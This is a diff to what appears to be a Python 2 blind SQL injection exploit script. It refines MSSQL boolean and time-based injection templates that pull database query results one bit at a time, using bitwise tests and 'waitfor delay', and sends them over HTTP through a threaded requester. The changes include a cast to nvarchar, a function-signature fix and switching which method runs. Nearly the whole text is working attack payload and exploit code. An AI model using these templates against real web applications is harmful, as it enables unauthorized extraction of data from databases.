@@ -24,7 +24,7 @@ def quote(s):
 
 def mssql_boolean():
 
-  template = " and 1=(select case when ((ascii(substring((${query}),${char_pos},1))&${bit_pos})=${bit_pos}) then 1 else 0 end)"
+  template = " and 1=(select case when ((ascii(substring(cast((${query}) as nvarchar(4000)),${char_pos},1))&${bit_pos})=${bit_pos}) then 1 else 0 end)"
 
   def make_requester():
     return Requester_HTTP(
@@ -38,9 +38,9 @@ def mssql_boolean():
 
   return Method_bitwise(make_requester, template, num_threads=7)
 
-def mssql_time(sql):
+def mssql_time():
 
-  template = " if((ascii(substring((${query}),${char_pos},1))&${bit_pos})=${bit_pos}) waitfor delay '0:0:2'--"
+  template = " if((ascii(substring(cast((${query}) as nvarchar(4000)),${char_pos},1))&${bit_pos})=${bit_pos}) waitfor delay '0:0:2'--"
 
   def make_requester():
     return Requester_HTTP(
@@ -86,15 +86,11 @@ def mysql_time():
 
   return Method_bitwise(make_requester, template, num_threads=1)
 
-#sqli = MySQL_Blind(mysql_boolean())
 #sqli = MSSQL_Blind(mssql_boolean())
+#sqli = MSSQL_Blind(mssql_time())
 sqli = MySQL_Blind(mysql_boolean())
 #sqli = MySQL_Blind(mysql_time())
 
-start = time()
 for r in sqli.exploit():
-  stop = time()
   print r
-  #print "dumped in %.2f seconds:" % (stop-start)
-  start = time()
- 
+
